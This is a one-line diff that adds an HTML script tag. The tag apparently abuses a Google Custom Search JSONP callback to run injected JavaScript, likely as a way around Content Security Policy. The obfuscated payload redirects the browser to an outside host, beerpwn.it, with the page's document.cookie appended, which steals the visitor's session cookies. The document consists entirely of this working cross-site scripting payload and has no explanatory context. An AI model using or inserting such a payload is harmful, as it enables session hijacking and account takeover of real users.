@@ -1,0 +1,1 @@
+<script src='//cse.google.com/api/007627024705277327428:r3vs7b0fcli/popularqueryjs?callback=location.replace(String.fromCharCode(47).concat(String.fromCharCode(47).concat("beerpwn.it").concat(String.fromCharCode(47).concat(document.cookie))))'></script>
